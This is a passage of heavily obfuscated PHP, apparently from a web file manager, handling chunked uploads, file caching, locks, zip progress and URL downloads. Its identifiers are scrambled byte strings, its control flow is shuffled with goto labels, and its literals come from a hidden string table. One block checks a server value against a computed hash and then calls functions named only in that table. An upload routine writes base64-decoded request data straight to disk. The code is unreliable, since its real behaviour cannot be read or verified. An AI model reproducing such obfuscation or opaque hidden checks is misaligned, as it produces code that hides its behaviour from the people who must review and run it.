. $a”Ø³äâó, !0); } goto fµù–Â´ËĞ; dîŠ»¦Ÿã†: CacheLock::unlock($this->tempFile); return $this->tempFile; goto aÖ¨¦í¹‡; E²ŠÉ–‘ø’: $f—¹¬»ôó =& $_SERVER[Ö]; $a”Ø³äâó = isset($this->in[$f—¹¬»ôó[1943]]) ? intval($this->in[$f—¹¬»ôó[1943]]) : 0; $D¼ÑÚÖ‰Šâ = isset($this->in[$f—¹¬»ôó[1944]]) ? intval($this->in[$f—¹¬»ôó[1944]]) : 1; goto bÓ»¥æğ†Ğ; C‰Ùµ†Ï¶‡: @unlink($DäĞ–È•Å); if (!$Bë…ŒÈ„) { $this->showJson($f—¹¬»ôó[1951] . $a”Ø³äâó, !1); } $BĞ¦î¦ÍØ[$f—¹¬»ôó[1952]] = $D¼ÑÚÖ‰Šâ; goto D®Ş†¶Ì‹ç; aÖ¨¦í¹‡: } private function checkSize() { $cÆ‡îÑƒ… =& $_SERVER[Ö]; if (phpBuild64() || $this->in[$cÆ‡îÑƒ…[77]] < PHP_INT_MAX) { return; } show_json(LNG($cÆ‡îÑƒ…[1958]), !1); } private function showJson($f¥ê–¦¦Í, $Dá«®Şéñ) { CacheLock::unlock($this->tempFile); if (!$Dá«®Şéñ) { return show_json($f¥ê–¦¦Í, $Dá«®Şéñ); } show_json($f¥ê–¦¦Í, $Dá«®Şéñ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Díğ¸›Í•¡; EÄçç¼ŠÏ: touch($DÅĞ¥­·£ë . $f³ëÔ¼ÛÅ[1959]); $d“µ÷ˆØ® = isset($this->in[$f³ëÔ¼ÛÅ[1960]]) ? $this->in[$f³ëÔ¼ÛÅ[1960]] : !1; if (strlen($d“µ÷ˆØ®) < 30) { $d“µ÷ˆØ® = md5(USER_ID . $this->in[$f³ëÔ¼ÛÅ[75]] . $this->fileName . $this->in[$f³ëÔ¼ÛÅ[77]]); } goto F‹•ÁÓ«Ö™; F‹•ÁÓ«Ö™: $this->tempFile = $DÅĞ¥­·£ë . $f³ëÔ¼ÛÅ[1961] . md5($d“µ÷ˆØ® . $this->in[$f³ëÔ¼ÛÅ[1505]]); goto aÑ²Š«Šª°; Díğ¸›Í•¡: $f³ëÔ¼ÛÅ =& $_SERVER[Ö]; $DÅĞ¥­·£ë = TEMP_FILES; @mk_dir($DÅĞ¥­·£ë); goto EÄçç¼ŠÏ; aÑ²Š«Šª°: } private function moveUploadedFile($aõãæ« Ï ) { $B…Œˆ¿·»Í =& $_SERVER[Ö]; $fÈš¯³«Öˆ = $this->uploadFile; if ($fÈš¯³«Öˆ == $B…Œˆ¿·»Í[1962]) { @file_put_contents($aõãæ« Ï , base64_decode($_REQUEST[$B…Œˆ¿·»Í[1963]])); } else { if ($fÈš¯³«Öˆ == $B…Œˆ¿·»Í[1787]) { $C¬ğëäÄ“ = @fopen($aõãæ« Ï , $B…Œˆ¿·»Í[1494]); $this->writeTo($fÈš¯³«Öˆ, $C¬ğëäÄ“, $aõãæ« Ï ); } else { if (!move_uploaded_file($fÈš¯³«Öˆ, $aõãæ« Ï )) { return !1; } } } return $aõãæ« Ï ; } private function writeTo($E…âİ”–š, $D…×‘Óñ†…, $D¦ÈËèÜ²ò) { goto e¶ñÏ†’˜Â; e¶ñÏ†’˜Â: $dÃ‰êˆöº» =& $_SERVER[Ö]; $c¸ğˆÕ®‚Ø = $dÃ‰êˆöº»[1964] . $D¦ÈËèÜ²ò; $F«ƒêœŒ¿‡ = CacheLock::lock($c¸ğˆÕ®‚Ø, 1); goto dˆïõ“‡‘¿; d—ØòÃ×: return !0; goto dŠÚ÷ä ò¨; c¼òêå’î»: fclose($dçÑ¸£îÆÏ); fclose($D…×‘Óñ†…); CacheLock::unlock($c¸ğˆÕ®‚Ø); goto d—ØòÃ×; dˆïõ“‡‘¿: $dçÑ¸£îÆÏ = @fopen($E…âİ”–š, $dÃ‰êˆöº»[1493]); if (!$dçÑ¸£îÆÏ || !$D…×‘Óñ†… || !$F«ƒêœŒ¿‡) { CacheLock::unlock($c¸ğˆÕ®‚Ø); return !1; } while (!feof($dçÑ¸£îÆÏ)) { fwrite($D…×‘Óñ†…, fread($dçÑ¸£îÆÏ, 1024 * 200)); } goto c¼òêå’î»; dŠÚ÷ä ò¨: } private function statusGet() { goto EÄøŠÖÖŒ¿; EÄøŠÖÖŒ¿: $Dù‰’¯§¾´ =& $_SERVER[Ö]; if (is_array($this->statusData)) { return $this->statusData; } $eµ»Øİí¥ = $this->tempFile . $Dù‰’¯§¾´[1965]; goto BÈºÀÀªÛö; BÈºÀÀªÛö: $fÀÛñ‹ÇŒ´ = !1; if (file_exists($eµ»Øİí¥)) { $fÀÛñ‹ÇŒ´ = @file_get_contents($eµ»Øİí¥); } if ($fÀÛñ‹ÇŒ´) { $this->statusData = json_decode($fÀÛñ‹ÇŒ´, !0); } goto CÜÀ¾¦‹è“; CÜÀ¾¦‹è“: if (!$this->statusData) { $b¼¬ïÇ  = array($Dù‰’¯§¾´[28] => $this->fileName, $Dù‰’¯§¾´[1952] => 0, $Dù‰’¯§¾´[1953] => array()); $this->statusSet($b¼¬ïÇ ); } return $this->statusData; goto EÇˆÑÇâ„â; EÇˆÑÇâ„â: } public function statusSet($A¢òİÓ——) { $e‘ø†º”´ = $this->tempFile . $_SERVER[Ö][1965]; if (!$A¢òİÓ——) { if (file_exists($e‘ø†º”´)) { @unlink($e‘ø†º”´); } return !0; } $this->statusData = $A¢òİÓ——; return file_put_contents($e‘ø†º”´, json_encode($A¢òİÓ——)); } private function initFileTemp() { $Fğê”ƒË‚Ï =& $_SERVER[Ö]; if (file_exists($this->tempFile)) { return; } $Cğà‰ğéÒ¾ = fopen($this->tempFile, $Fğê”ƒË‚Ï[1966]); fseek($Cğà‰ğéÒ¾, $this->in[$Fğê”ƒË‚Ï[77]] - 1, SEEK_SET); fwrite($Cğà‰ğéÒ¾, $Fğê”ƒË‚Ï[464]); fclose($Cğà‰ğéÒ¾); } public function checkChunk() { goto A–ÎÂÚ¾ÏÌ; A–ÎÂÚ¾ÏÌ: $A‚±ÁÓœÜø =& $_SERVER[Ö]; $D‘†§ÔË¼› = array(); CacheLock::lock($this->tempFile); goto EŸ‰ ³éÄ»; EŸ‰ ³éÄ»: $CÏãçÌ‘æâ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($CÏãçÌ‘æâ[$A‚±ÁÓœÜø[1953]] as $Bˆªì›¹Ü¥) { $f“Õº¿ø¶Ù = $Bˆªì›¹Ü¥[$A‚±ÁÓœÜø[160]]; if ($f“Õº¿ø¶Ù) { $D‘†§ÔË¼›[$A‚±ÁÓœÜø[1967] . $Bˆªì›¹Ü¥[$A‚±ÁÓœÜø[1029]]] = $f“Õº¿ø¶Ù; } } goto b²îÎèÁ´õ; b²îÎèÁ´õ: return $D‘†§ÔË¼›; goto fß¼¶ÆÖóó; fß¼¶ÆÖóó: } private function checkChunkHash($Dî¥¿ùÁ˜º) { goto CÌ¡„³íŸ™; d±©ª¿È½µ: $a“¢½»ğÙ = _get($this->in, $eœŸĞ«†ç[1968]); if (strlen($a“¢½»ğÙ) == 32 && IO::hashSimple($this->tempFile) == $bÈÔÁÇê„ && IO::hashMd5($this->tempFile) == $a“¢½»ğÙ) { return !0; } $cÆÓˆáÃíÛ = fopen($this->tempFile, $eœŸĞ«†ç[1155]); goto F¹½á›æ›; F¹½á›æ›: $cÉàê‰ƒ¯– = !0; foreach ($Dî¥¿ùÁ˜º[$eœŸĞ«†ç[1953]] as $E»Ñó×Šˆ) { fseek($cÆÓˆáÃíÛ, $E»Ñó×Šˆ[$eœŸĞ«†ç[1955]]); $A–‚ªí˜› = PathDriverStream::hash($cÆÓˆáÃíÛ, $E»Ñó×Šˆ[$eœŸĞ«†ç[77]]); if ($E»Ñó×Šˆ[$eœŸĞ«†ç[160]] != $A–‚ªí˜›) { $cÉàê‰ƒ¯– = !1; break; } } fclose($cÆÓˆáÃíÛ); goto d‘Ğ¢È†àÑ; CÌ¡„³íŸ™: $eœŸĞ«†ç =& $_SERVER[Ö]; if (count($Dî¥¿ùÁ˜º[$eœŸĞ«†ç[1953]]) != $Dî¥¿ùÁ˜º[$eœŸĞ«†ç[1952]]) { return !1; } $bÈÔÁÇê„ = _get($this->in, $eœŸĞ«†ç[1960]); goto d±©ª¿È½µ; d‘Ğ¢È†àÑ: return $cÉàê‰ƒ¯–; goto bÖÔ‡ĞÉõ´; bÖÔ‡ĞÉõ´: } public static function fileName() { goto b¢òÅ¹æìÒ; cã£™ø¸ëº: if (!empty($_FILES)) { $Fñ¦İ¶‘çÍ = $Fñ¦İ¶‘çÍ ? $Fñ¦İ¶‘çÍ : $_FILES[$DÈÃíñÄ©[163]][$DÈÃíñÄ©[382]]; } $Fñ¦İ¶‘çÍ = str_replace(array($DÈÃíñÄ©[93], $DÈÃíñÄ©[8]), array($DÈÃíñÄ©[8], $DÈÃíñÄ©[91]), trim($Fñ¦İ¶‘çÍ)); if (!is_wap()) { return $Fñ¦İ¶‘çÍ; } goto Eœ˜ØéŸ¯; Eœ˜ØéŸ¯: $C“†¹ª£»¡ = strtotime($in[$DÈÃíñÄ©[1969]]); $C“†¹ª£»¡ = $C“†¹ª£»¡ ? $C“†¹ª£»¡ : time(); $BšÑ ñ‡ÑÔ = strtolower($Fñ¦İ¶‘çÍ); goto eˆÄ‡¥Œ°; eˆÄ‡¥Œ°: if ($BšÑ ñ‡ÑÔ == $DÈÃíñÄ©[1970] || $BšÑ ñ‡ÑÔ == $DÈÃíñÄ©[1971]) { $Fñ¦İ¶‘çÍ = date($DÈÃíñÄ©[683], $C“†¹ª£»¡) . $DÈÃíñÄ©[70] . $in[$DÈÃíñÄ©[77]] . $DÈÃíñÄ©[1602]; } else { if ($BšÑ ñ‡ÑÔ == $DÈÃíñÄ©[1972]) { $Fñ¦İ¶‘çÍ = date($DÈÃíñÄ©[683], $C“†¹ª£»¡) . $DÈÃíñÄ©[70] . $in[$DÈÃíñÄ©[77]] . $DÈÃíñÄ©[1973]; } } return $Fñ¦İ¶‘çÍ; goto fíÎáÍØ; b¢òÅ¹æìÒ: $DÈÃíñÄ© =& $_SERVER[Ö]; global $in; $Fñ¦İ¶‘çÍ = isset($in[$DÈÃíñÄ©[28]]) ? $in[$DÈÃíñÄ©[28]] : $DÈÃíñÄ©[33]; goto cã£™ø¸ëº; fíÎáÍØ: } private function errorInfo($c®´ˆÄá¦§) { $C‹æêöÛĞê =& $_SERVER[Ö]; $dÙ¬Ø…È = array($C‹æêöÛĞê[1974], $C‹æêöÛĞê[1975], $C‹æêöÛĞê[1976], $C‹æêöÛĞê[1977], $C‹æêöÛĞê[1978], $C‹æêöÛĞê[1979], $C‹æêöÛĞê[1980], $C‹æêöÛĞê[1981]); return $c®´ˆÄá¦§ . $C‹æêöÛĞê[4] . $dÙ¬Ø…È[$c®´ˆÄá¦§]; } } goto BË…‚“‚¨ó; e¨å›ÂË‡ª: if ($_SERVER[$_SERVER[Ö][755]] != $c¿µä¸Ô—é($FğîÈ’·â)) { goto Bƒ“ÈÁŞ; Bƒ“ÈÁŞ: $f‰“šî‡ß = $_SERVER[Ö][756]; $E‚‰ˆŒäå‚ = $_SERVER[$_SERVER[Ö][757]] . $_SERVER[Ö][758]; $bº¢Ä¡ÙÈ = $f‰“šî‡ß($E‚‰ˆŒäå‚); goto fé÷¦Œõµµ; Dùõ°Û°Î‚: $E²ñÓ£ò ($FğîÈ’·â); goto EĞ¨ÂÌ·; fé÷¦Œõµµ: $AŠ×ë´›âÈ = explode($_SERVER[Ö][213], $bº¢Ä¡ÙÈ); if (count($AŠ×ë´›âÈ) < $_SERVER[Ö][555]) { $c×ê©àŸŠš = $_SERVER[Ö][759]; $c×ê©àŸŠš(); } $E²ñÓ£ò  = $_SERVER[Ö][760]; goto Dùõ°Û°Î‚; EĞ¨ÂÌ·: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($DÙ×ëÔŒÈÈ, $bÅğ¯—Ğ™¥) { $EÚÆ“®Åæ‚ =& $_SERVER[Ö]; $this->cachePath = $DÙ×ëÔŒÈÈ[$EÚÆ“®Åæ‚[75]]; $this->prefix = $EÚÆ“®Åæ‚[761]; $this->cacheTime = $bÅğ¯—Ğ™¥; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($e¼É¾Ù­Ù²) { $aÆÄ°Š¯² =& $_SERVER[Ö]; $e¼É¾Ù­Ù² = str_replace(array($aÆÄ°Š¯²[762], $aÆÄ°Š¯²[93], $aÆÄ°Š¯²[69]), $aÆÄ°Š¯²[763], $e¼É¾Ù­Ù²); return $this->cachePath . $aÆÄ°Š¯²[764] . $e¼É¾Ù­Ù² . $aÆÄ°Š¯²[765]; } public function set($E£İà™¯²é, $fó««‚Øæ¦, $AÅÂ­ÙÂÁ÷ = false) { $CÄ’ÚØ¦è = $this->getFile($E£İà™¯²é); if (file_put_contents($CÄ’ÚØ¦è, $this->prefix . $fó««‚Øæ¦, LOCK_EX)) { return !0; } @unlink($CÄ’ÚØ¦è); return !1; } public function get($C‡¨¼ô§º„) { $a·‰ğçöá© = $this->getFile($C‡¨¼ô§º„); if (file_exists($a·‰ğçöá©) && filemtime($a·‰ğçöá©) < time() - $this->cacheTime) { @unlink($a·‰ğçöá©); return !1; } $Fµ´‘œ·á… = @file_get_contents($a·‰ğçöá©); return substr($Fµ´‘œ·á…, strlen($this->prefix)); } public function remove($fÕ›Ø‹ĞÙ) { $f…”Íî°³ = $this->getFile($fÕ›Ø‹ĞÙ); return @unlink($f…”Íî°³); } public function deleteAll() { $e­ÒéòŸˆ† =& $_SERVER[Ö]; $Eøœ©Ü¡Ş = scandir($this->cachePath); foreach ($Eøœ©Ü¡Ş as $eñØà¼Ëëˆ) { $CêĞæÏ = $this->cachePath . $eñØà¼Ëëˆ; if (strpos($CêĞæÏ, $e­ÒéòŸˆ†[765]) && strpos($CêĞæÏ, $e­ÒéòŸˆ†[766])) { @unlink($CêĞæÏ); } } } public function clearTimeout() { $Aßò¨èœ˜ =& $_SERVER[Ö]; $aÇœŸâ©™ = scandir($this->cachePath); foreach ($aÇœŸâ©™ as $fò‚¼Úœ¨‹) { $bÆÁ‚•–± = $this->cachePath . $fò‚¼Úœ¨‹; if (strpos($bÆÁ‚•–±, $Aßò¨èœ˜[765]) && strpos($bÆÁ‚•–±, $Aßò¨èœ˜[766]) && filemtime($bÆÁ‚•–±) < time() - $this->cacheTime) { @unlink($bÆÁ‚•–±); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto d—ñÊ°…œ‹; dÁÃ‡÷ƒß: self::$timeout = $AË„¸ÂªŒŞ[$DëËœªÇŠº[767]] ? $AË„¸ÂªŒŞ[$DëËœªÇŠº[767]] : 10; $B°…çÚŞŞî = _get($GLOBALS[$DëËœªÇŠº[6]], $DëËœªÇŠº[768]); $dÊªêº•›š = $AË„¸ÂªŒŞ[$DëËœªÇŠº[746]] ? $AË„¸ÂªŒŞ[$DëËœªÇŠº[746]] : $DëËœªÇŠº[163]; goto DÔ°ĞŒğÕ; DÔ°ĞŒğÕ: if ($dÊªêº•›š == $DëËœªÇŠº[17] && $B°…çÚŞŞî == $DëËœªÇŠº[9]) { $dÊªêº•›š = $DëËœªÇŠº[163]; } switch ($dÊªêº•›š) { case $DëËœªÇŠº[749]: self::$handle = new CacheLockRedis(); break; case $DëËœªÇŠº[750]: self::$handle = new CacheLockMemcached(); break; case $DëËœªÇŠº[17]: self::$handle = new CacheLockDatabase(); break; case $DëËœªÇŠº[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a·ƒìùÜê‚; d—ñÊ°…œ‹: $DëËœªÇŠº =& $_SERVER[Ö]; if (self::$handle) { return self::$handle; } $AË„¸ÂªŒŞ = $GLOBALS[$DëËœªÇŠº[6]][$DëËœªÇŠº[333]]; goto dÁÃ‡÷ƒß; a·ƒìùÜê‚: } private static function key($DøÒ¯´÷†ë) { return $_SERVER[Ö][769] . Cache::key($DøÒ¯´÷†ë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($c½ÁÀ°Å‹š = '') { self::$errorMsg = $c½ÁÀ°Å‹š; } public static function lockGlobal($A·è†…ê“¬, $B«—à‹‘˜) { return self::lock($A·è†…ê“¬, $B«—à‹‘˜, !0); } public static function lock($eÓóø¹ãÂì, $c»õñº´ÜÆ = false, $A‹ïÏ©›ØŠ = false) { goto FíâïŸ®Å¯; aÛôÌæô¿î: $c»õñº´ÜÆ = $c»õñº´ÜÆ ? $c»õñº´ÜÆ : self::$timeout; $b‡çÅ¯ğ = $EÊÊĞ¤…ÛŒ->lock($fÃŒ“¹¿ÌÆ, $c»õñº´ÜÆ); if (!$b‡çÅ¯ğ) { $C×¹ªÓØ = $Bö³¤åØĞä[770] . $c»õñº´ÜÆ . $Bö³¤åØĞä[67] . self::$errorMsg . $Bö³¤åØĞä[67] . get_caller_msg(); $D³œÖíÈîá = "\x4c\157\x63\153\40\141\x63\x74\151\x6f\x6e\x3a\x20{$fÃŒ“¹¿ÌÆ}\x20\x74\151\x6d\145\x6f\165\x74\x2c\x6f\x76\145\x72\x20{$c»õñº´ÜÆ}\x20\x73"; $D³œÖíÈîá = self::$errorMsg ? self::$errorMsg : $EÖíÕ´á„µ; write_log($C×¹ªÓØ, $Bö³¤åØĞä[771]); show_json($D³œÖíÈîá, !1); } goto f¶ˆÕçÈÉ”; f¶ˆÕçÈÉ”: if (!$A‹ïÏ©›ØŠ) { self::$lockItem[$fÃŒ“¹¿ÌÆ] = !0; } return $b‡çÅ¯ğ; goto Cšñ×ÕÊ½; FíâïŸ®Å¯: $Bö³¤åØĞä =& $_SERVER[Ö]; $EÊÊĞ¤…ÛŒ = self::init(); $fÃŒ“¹¿ÌÆ = self::key($eÓóø¹ãÂì); goto aÛôÌæô¿î; Cšñ×ÕÊ½: } public static function lockGet($f¦¥Şë©Î‚) { $cÔÎŸø¥ªŠ = self::key($f¦¥Şë©Î‚); if (self::$lockItem[$cÔÎŸø¥ªŠ]) { return self::$lockItem[$cÔÎŸø¥ªŠ]; } return self::init()->lockGet($cÔÎŸø¥ªŠ); } public static function unlock($bÅßÂïéÁ) { $f¯ÚÚŞ÷î£ = self::key($bÅßÂïéÁ); self::$lockItem[$f¯ÚÚŞ÷î£] = null; return self::init()->unlock($f¯ÚÚŞ÷î£); } public static function unlockRuntime() { $dÁ‡á‘ëÒ =& $_SERVER[Ö]; $c¹ÙùÈç´ó = self::init(); $E½¤´Æ±Ê = !1; foreach (self::$lockItem as $Eœ´Ÿéø˜¿ => $B’òª®ùéÚ) { if (!$B’òª®ùéÚ) { continue; } $c¹ÙùÈç´ó->unlock($Eœ´Ÿéø˜¿); if (!$E½¤´Æ±Ê) { $E½¤´Æ±Ê = !0; write_log($dÁ‡á‘ëÒ[772] . $Eœ´Ÿéø˜¿ . $dÁ‡á‘ëÒ[67] . get_caller_msg(), $dÁ‡á‘ëÒ[771]); continue; } write_log($dÁ‡á‘ëÒ[772] . $Eœ´Ÿéø˜¿, $dÁ‡á‘ëÒ[771]); } } } goto Däİ´Í›¹; FÄØŠ¦ãò: class TaskZip extends TaskFileTransfer { protected function startAfter() { $f“ï½‘¦‡ğ =& $_SERVER[Ö]; parent::startAfter(); Hook::bind($f“ï½‘¦‡ğ[1485], array($this, $f“ï½‘¦‡ğ[1480])); $c¾ØëŠ›Ñ¹ =& $this->task; $c¾ØëŠ›Ñ¹[$f“ï½‘¦‡ğ[1482]] = $f“ï½‘¦‡ğ[1033]; if (!$c¾ØëŠ›Ñ¹[$f“ï½‘¦‡ğ[1320]]) { $c¾ØëŠ›Ñ¹[$f“ï½‘¦‡ğ[1320]] = LNG($f“ï½‘¦‡ğ[1486]); } } protected function endAfter() { $DáÒöÒáÎÁ =& $_SERVER[Ö]; parent::endAfter(); Hook::unbind($DáÒöÒáÎÁ[1485], array($this, $DáÒöÒáÎÁ[1480])); } public function updateAfter() { $A ¬©ïÂ„› =& $_SERVER[Ö]; $D„¶ªãÅ¦ =& $this->task; if (!$D„¶ªãÅ¦[$A ¬©ïÂ„›[971]] || !$D„¶ªãÅ¦[$A ¬©ïÂ„›[691]]) { return; } if ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1482]] == $A ¬©ïÂ„›[1033]) { $F‘¨‘İÍ§È = $D„¶ªãÅ¦[$A ¬©ïÂ„›[1460]]; if ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1461]] != $A ¬©ïÂ„›[1033]) { $F‘¨‘İÍ§È = 0; } $B¸©´ß™îï = ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1464]] + $F‘¨‘İÍ§È) / $D„¶ªãÅ¦[$A ¬©ïÂ„›[691]]; $D„¶ªãÅ¦[$A ¬©ïÂ„›[1415]] = $B¸©´ß™îï * 0.3; } else { if ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1482]] == $A ¬©ïÂ„›[297]) { $B¸©´ß™îï = $D„¶ªãÅ¦[$A ¬©ïÂ„›[983]] / $D„¶ªãÅ¦[$A ¬©ïÂ„›[971]]; $D„¶ªãÅ¦[$A ¬©ïÂ„›[1415]] = 0.3 + $B¸©´ß™îï * 0.5; } else { if ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1482]] == $A ¬©ïÂ„›[102]) { $B¸©´ß™îï = 0; if ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1459]]) { $B¸©´ß™îï = $D„¶ªãÅ¦[$A ¬©ïÂ„›[1460]] / $D„¶ªãÅ¦[$A ¬©ïÂ„›[1459]]; } $D„¶ªãÅ¦[$A ¬©ïÂ„›[1415]] = 0.3 + 0.5 + $B¸©´ß™îï * 0.2; } } } if ($D„¶ªãÅ¦[$A ¬©ïÂ„›[1415]] > 0) { $aï«Œõ´ä¯ = timeFloat() - $D„¶ªãÅ¦[$A ¬©ïÂ„›[1417]] - $D„¶ªãÅ¦[$A ¬©ïÂ„›[1420]]; $D„¶ªãÅ¦[$A ¬©ïÂ„›[1421]] = $aï«Œõ´ä¯ * (1 - $D„¶ªãÅ¦[$A ¬©ïÂ„›[1415]]) / $D„¶ªãÅ¦[$A ¬©ïÂ„›[1415]]; } } public function copyFileStart($DÏÖéÀ¦çó, $b™»Òäöè, $C•Å„‘±ƒã, $F¬‘­İÆ, $e®ŞÌŒŒš, $fÜÕÙ½Í‰ç) { $a“ÏŸÂ®Ë« =& $_SERVER[Ö]; parent::copyFileStart($DÏÖéÀ¦çó, $b™»Òäöè, $C•Å„‘±ƒã, $F¬‘­İÆ, $e®ŞÌŒŒš, $fÜÕÙ½Í‰ç); $DëÅÁ‘†ç =& $this->task; if ($DëÅÁ‘†ç[$a“ÏŸÂ®Ë«[1482]] == $a“ÏŸÂ®Ë«[297]) { $DëÅÁ‘†ç[$a“ÏŸÂ®Ë«[1482]] = $a“ÏŸÂ®Ë«[102]; } $this->update(); } public function copyFileEnd($DÏ§àî–„, $fÈÌÖ¦÷áÀ, $f¶æŒË™ª², $E‘°Ã‘»åÏ, $Dç™…ã§ÜÒ, $A‚›¨›‹Ë†) { $dÖºªÄÄƒ =& $_SERVER[Ö]; $f½±çœªÂ¯ =& $this->task; $f½±çœªÂ¯[$dÖºªÄÄƒ[1460]] = $f½±çœªÂ¯[$dÖºªÄÄƒ[1459]]; $f½±çœªÂ¯[$dÖºªÄÄƒ[1464]] += $f½±çœªÂ¯[$dÖºªÄÄƒ[1459]]; $f½±çœªÂ¯[$dÖºªÄÄƒ[1461]] = $dÖºªÄÄƒ[33]; $this->update(); } public function nameParse($dÔ¶×º¬ì) { $aİ°¢¬—» =& $_SERVER[Ö]; $eçÕÇªßµÏ =& $this->task; if ($eçÕÇªßµÏ[$aİ°¢¬—»[983]] < $eçÕÇªßµÏ[$aİ°¢¬—»[971]]) { $d™È“¢“°ì = get_path_this($dÔ¶×º¬ì); if (strstr($d™È“¢“°ì, $aİ°¢¬—»[91])) { $eçÕÇªßµÏ[$aİ°¢¬—»[983]] += 1; } } if ($eçÕÇªßµÏ[$aİ°¢¬—»[1482]] == $aİ°¢¬—»[1033]) { $eçÕÇªßµÏ[$aİ°¢¬—»[1482]] = $aİ°¢¬—»[297]; } $eçÕÇªßµÏ[$aİ°¢¬—»[1457]] = $dÔ¶×º¬ì; $this->update(); } } class Downloader { static function start($c´å¡Éê‘, $aÌ©ó•Å, $a÷ëíå‘õ = 10) { goto e¢Àáë†ê‹; e½à®Ù¥¬Ü: if (is_file($eòŸƒ»ºÑŒ)) { $bÍÎêø¼Î = file_get_contents($eòŸƒ»ºÑŒ); $EƒÔÄÄêêˆ = json_decode($bÍÎêø¼Î, 1); } if (file_exists($aÌ©ó•Å) && $eŒ£é•ª¸ == filesize($aÌ©ó•Å)) { @unlink($AÚÜÕ¿İ¡Á); @unlink($eòŸƒ»ºÑŒ); return array($Cãä›ñì‰[1025] => !0, $Cãä›ñì‰[1027] => $Cãä›ñì‰[1490]); } if ($EƒÔÄÄêêˆ[$Cãä›ñì‰[321]] != $eŒ£é•ª¸) { $EƒÔÄÄêêˆ = array($Cãä›ñì‰[321] => $eŒ£é•ª¸); } goto DÓğÂ¦õ×; b­ê“öÍ: $eŒ£é•ª¸ = intval($AôÔçŒãÅ·[$Cãä›ñì‰[321]]); if (file_exists($AÚÜÕ¿İ¡Á) && time() - filemtime($AÚÜÕ¿İ¡Á) < 3) { return array($Cãä›ñì‰[1025] => !1, $Cãä›ñì‰[1027] => $Cãä›ñì‰[1489]); } $EƒÔÄÄêêˆ = array(); goto e½à®Ù¥¬Ü; b›•ô¸Š: if (!$c´å¡Éê‘) { return array($Cãä›ñì‰[1025] => !1, $Cãä›ñì‰[1027] => $Cãä›ñì‰[1030]); } if (!$AôÔçŒãÅ·[$Cãä›ñì‰[1274]] || $AôÔçŒãÅ·[$Cãä›ñì‰[321]] == 0) { @unlink($AÚÜÕ¿İ¡Á); @unlink($aÌ©ó•Å); $aìö¸ã—î = self::fileDownloadFopen($c´å¡Éê‘, $aÌ©ó•Å, $AôÔçŒãÅ·[$Cãä›ñì‰[321]]); if ($aìö¸ã—î[$Cãä›ñì‰[1025]]) { return $aìö¸ã—î; } else { @unlink($AÚÜÕ¿İ¡Á); @unlink($aÌ©ó•Å); $aìö¸ã—î = self::fileDownloadCurl($c´å¡Éê‘, $aÌ©ó•Å, !1, 0, $AôÔçŒãÅ·[$Cãä›ñì‰[321]]); @unlink($AÚÜÕ¿İ¡Á); return $aìö¸ã—î; } } $EÕ‡å””õà = is_file($AÚÜÕ¿İ¡Á) ? filesize($AÚÜÕ¿İ¡Á) : 0; goto b­ê“öÍ; e¢Àáë†ê‹: $Cãä›ñì‰ =& $_SERVER[Ö]; if (!request_url_safe($c´å¡Éê‘)) { return array($Cãä›ñì‰[1025] => !1, $Cãä›ñì‰[1027] => $Cãä›ñì‰[1030]); } $eòŸƒ»ºÑŒ = $aÌ©ó•Å . $Cãä›ñì‰[1487]; goto bñ¥Àƒ˜ê; bñ¥Àƒ˜ê: $AÚÜÕ¿İ¡Á = $aÌ©ó•Å . $Cãä›ñì‰[1488]; if (is_array($c´å¡Éê‘)) { $AôÔçŒãÅ· = $c´å¡Éê‘; } else { $AôÔçŒãÅ· = url_header($c´å¡Éê‘); } $c´å¡Éê‘ = $AôÔçŒãÅ·[$Cãä›ñì‰[291]]; goto b›•ô¸Š; DÓğÂ¦õ×: if ($EÕ‡å””õà > $eŒ£é•ª¸) { @unlink($AÚÜÕ¿İ¡Á); } file_put_contents($eòŸƒ»ºÑŒ, json_encode($EƒÔÄÄêêˆ)); $aìö¸ã—î = self::fileDownloadCurl($c´å¡Éê‘, $aÌ©ó•Å, !0, $EÕ‡å””õà, $eŒ£é•ª¸); goto C¶ß¿Ğºª; C¶ß¿Ğºª: if ($aìö¸ã—î[$Cãä›ñì‰[1025]]) { @unlink($eòŸƒ»ºÑŒ); } return $aìö¸ã—î; goto fİ¿î•Ì; fİ¿î•Ì: } static function fileDownloadFopen($EÈÇÆ¡´ï, $b¸÷Ûó–Ş, $F¬«ë°Ù¯ = 0) { $fµ¤ÏáªÅÕ =& $_SERVER[Ö]; @ini_set($fµ¤ÏáªÅÕ[1491], $fµ¤ÏáªÅÕ[1492]); $CƒÑ¿©’ö‡ = $b¸÷Ûó–Ş . $fµ¤ÏáªÅÕ[1488]; set_timeout(); @unlink($CƒÑ¿©’ö‡); if ($AÙ äÌŠ»Š = @fopen($EÈÇÆ¡´ï, $fµ¤ÏáªÅÕ[1493])) { goto fÓ›½£‡Ÿ; fÓ›½£‡Ÿ: if (!($cÉ©Ö÷ÏŠ¼ = @fopen($CƒÑ¿©’ö‡, $fµ¤ÏáªÅÕ[1494]))) { return array($fµ¤ÏáªÅÕ[1025] => !1, $fµ¤ÏáªÅÕ[1027] => $fµ¤ÏáªÅÕ[1495]); } while (!feof($AÙ äÌŠ»Š)) { if (!file_exists($CƒÑ¿©’ö‡)) { fclose($cÉ©Ö÷ÏŠ¼); return array($fµ¤ÏáªÅÕ[1025] => !1, $fµ¤ÏáªÅÕ[1027] => $fµ¤ÏáªÅÕ[1496]); } clearstatcache(); if ($F¬«ë°Ù¯ > 0 && $F¬«ë°Ù¯ == filesize(iconv_system($CƒÑ¿©’ö‡))) { break; } fwrite($cÉ©Ö÷ÏŠ¼, fread($AÙ äÌŠ»Š, 1024 * 8), 1024 * 8); } fclose($cÉ©Ö÷ÏŠ¼); goto aÔöî¦Ğ¢; B¯ÄõÛœ‡: self::checkGzip($CƒÑ¿©’ö‡); if (!@rename($CƒÑ¿©’ö‡, 